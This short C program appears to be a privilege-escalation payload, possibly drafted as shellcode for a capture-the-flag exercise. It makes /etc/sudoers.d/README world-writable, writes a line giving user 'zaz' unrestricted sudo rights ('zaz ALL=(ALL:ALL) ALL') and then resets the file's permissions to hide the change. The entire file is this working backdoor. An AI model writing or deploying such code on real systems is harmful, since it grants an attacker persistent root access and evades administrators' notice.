#include <sys/stat.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>

// BUFFERS
//#define PATH			"test.txt"
#define PATH			"/etc/sudoers.d/README"
#define CONTENT			"zaz ALL=(ALL:ALL) ALL\n"

// MUST FIND
# define ONE			1
# define LENGTH			22
# define MODE			0777
# define DEFAULT_MODE	0440
# define FD				3

void main(void)
{
	chmod(PATH, MODE);
	open(PATH, ONE);
	write(FD, CONTENT, LENGTH);
	chmod(PATH, DEFAULT_MODE);
	exit(1);
}
